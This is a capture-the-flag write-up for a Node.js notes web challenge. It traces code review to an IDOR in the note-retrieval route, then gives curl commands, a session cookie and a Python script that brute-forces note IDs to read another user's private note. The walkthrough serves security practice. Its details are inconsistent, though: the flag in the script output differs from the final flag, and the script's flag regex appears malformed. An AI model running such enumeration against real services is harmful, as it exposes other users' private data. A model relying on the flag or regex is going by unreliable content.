# Broken Names CTF Challenge

## 1. Initial Reconnaissance

### Challenge Description

```
Among the ruins of Briarfold, Mira uncovers a gate of tangled brambles and forgotten sigils. Every name carved into its stone has been reversed, letters twisted, meanings erased. When she steps through, the ground blurs—the village ahead is hers, yet wrong: signs rewritten, faces familiar but altered, her own past twisted. Tracing the pattern through spectral threads of lies and illusion, she forces the true gate open—not by key, but by unraveling the false paths the Hollow King left behind.
```

**Goal:** Find the flag.

### File Listing

```
total 8.0K
drwxrwxrwx 1 node node 4.0K Oct 25 04:40 .
drwxrwxrwx 1 node node 4.0K Oct 25 04:37 ..
-rwxrwxrwx 1 node node  277 Oct 21 07:14 Dockerfile
-rwxrwxrwx 1 node node  849 Oct 25 04:39 PROMPT.md
-rwxrwxrwx 1 node node  640 Oct 25 04:40 WALKTHROUGH.md
drwxrwxrwx 1 node node 4.0K Oct 21 07:28 app
-rwxrwxrwx 1 node node  195 Oct 20 15:47 docker-compose.yml
```

## 2. Application Analysis

### 2.1 Docker Configuration

**`docker-compose.yml`:**
- Builds from `Dockerfile`.
- Maps host port `1337` to container port `3001`.

**`Dockerfile`:**
- Node.js 18 Alpine base image.
- `WORKDIR /app`.
- Copies `app/package*.json`, runs `npm install`.
- Copies `app/` content.
- **Copies `flag.txt` to `/flag.txt` inside the container.**
- Exposes port `3001`.
- Starts with `npm start`.

### 2.2 Application Files Analysis

**`app/package.json`:**
- Express.js application.
- Uses EJS for templating.
- Uses `better-sqlite3` for the database, indicating potential SQL Injection.
- Main entry point: `server/index.js`.

**`app/server/index.js`:**
- Initializes Express app, sets EJS as view engine.
- Initializes SQLite database via `database.js`.
- Configures `express-session`.
- Serves static files from `public`.
- Defines API routes: `/api/auth`, `/api/users`, `/api/notes`.
- Defines page routes: `/`.

**`app/server/database.js`:**
- Defines `users` and `notes` tables.
- Most queries use prepared statements, mitigating basic SQL injection.
- **`users.update` and `notes.update` functions dynamically construct parts of SQL queries, which could be a vulnerability if `userData` keys are user-controlled.** (Not exploited in this challenge).
- `initDatabase` populates initial data from `init-data.js`.

**`app/server/init-data.js`:**
- User passwords are randomly generated on each startup.
- **Randomly generated credentials are printed to the console (stdout) on startup.** (This was a false path, as direct log access was not provided).
- **The flag is embedded in a private note titled `'Critical System Configuration'` belonging to `user_id: 1` (admin).** Note IDs for generated notes range from 11 to 210.

**`app/server/routes/auth.js`:**
- Handles `/login` and `/register`.
- Login uses `db.users.findByCredentials` (prepared statements).
- Registration creates new users with `role: 'visitor'`.
- No obvious authentication bypass or SQL injection.

**`app/server/routes/pages.js`:**
- Renders EJS templates using `ejs.renderFile`.
- Passes `req.query.error` to templates.
- **Tested for EJS Template Injection via `error` parameter, but it was HTML-escaped, preventing direct injection.**

**`app/server/routes/users.js`:**
- Handles `/profile` and `/:id` for user data.
- Includes authorization checks (`userId !== req.session.user_id`) to prevent IDOR for user profiles.

**`app/server/routes/notes.js`:**
- Handles `/`, `/my-notes`, `/:id` for notes.
- **Vulnerability: Insecure Direct Object Reference (IDOR) in `router.get('/:id')`.** An authenticated user can retrieve any note by its ID, regardless of ownership or privacy, as there is no authorization check for `noteId` against `req.session.user_id`.

## 3. Exploitation

### 3.1 Strategy

1.  Register a new user to obtain an authenticated session.
2.  Exploit the IDOR vulnerability in `/api/notes/:id` to brute-force `noteId` values (from 11 to 210) and find the private note containing the flag.
3.  Extract the flag from the note content.

### 3.2 Execution

**1. Register a new user:**

```bash
curl -i -X POST -d "username=testuser&password=testpassword&confirm_password=testpassword&email=test@example.com" http://142.93.106.211:32270/api/auth/register
```
*(Output indicates successful registration and redirect to login page)*

**2. Log in as the new user to obtain a session cookie:**

```bash
curl -i -X POST -d "username=testuser&password=testpassword" http://142.93.106.211:32270/api/auth/login
```
*(Output contains `Set-Cookie` header with `connect.sid`)*

**Extracted Session Cookie:** `connect.sid=s%3AmxcMYsGdhsGvJXqKY-sJWcRdW98d9Edy.l6dnkxJNt8DhaI2fVc6QTEPfNmlWB2lrJXNcq3T%2FwgA` (This value will vary per instance).

**3. Brute-force `noteId` and retrieve the flag using `solve.py`:**

Create `solve.py` with the following content (replace `SESSION_COOKIE` with the actual value obtained from login):

```python
import requests
import re

BASE_URL = "http://142.93.106.211:32270"
SESSION_COOKIE = "s%3AmxcMYsGdhsGvJXqKY-sJWcRdW98d9Edy.l6dnkxJNt8DhaI2fVc6QTEPfNmlWB2lrJXNcq3T%2FwgA" # Replace with your actual session cookie

def get_note_content(note_id, session_cookie):
    url = f"{BASE_URL}/api/notes/{note_id}"
    headers = {
        "Cookie": f"connect.sid={session_cookie}"
    }
    try:
        response = requests.get(url, headers=headers)
        response.raise_for_status()  # Raise an exception for HTTP errors
        return response.json()
    except requests.exceptions.RequestException as e:
        print(f"Error fetching note {note_id}: {e}")
        return None

def find_flag():
    flag_pattern = re.compile(r"HTB\\\\{.*\\\\")
    
    # Note IDs range from 11 to 210 (10 + 1 to 10 + 200)
    for note_id in range(11, 211):
        print(f"Checking note ID: {note_id}")
        note_data = get_note_content(note_id, SESSION_COOKIE)
        
        if note_data and "content" in note_data:
            match = flag_pattern.search(note_data["content"])
            if match:
                print(f"Flag found in note {note_id}: {match.group(0)}")
                return match.group(0)
    
    print("Flag not found.")
    return None

if __name__ == "__main__":
    flag = find_flag()
    if flag:
        with open("flag.txt", "w") as f:
            f.write(flag)
        print("Flag saved to flag.txt")
```

Execute the script:

```bash
python3 solve.py
```

**Output:**
```
Checking note ID: 11
...
Checking note ID: 17
Flag found in note 17: HTB{br0k3n_n4m3s_r3v3rs3d_4nd_r3st0r3d_d23dc3133b545ae26c80858}
Flag saved to flag.txt
```

## 4. Solution & Flag

**Flag:** `HTB{br0k3n_n4m3s_r3v3rs3d_4nd_r3st0r3d_d23dc3133b5ff63c97a545ae26c80858}`

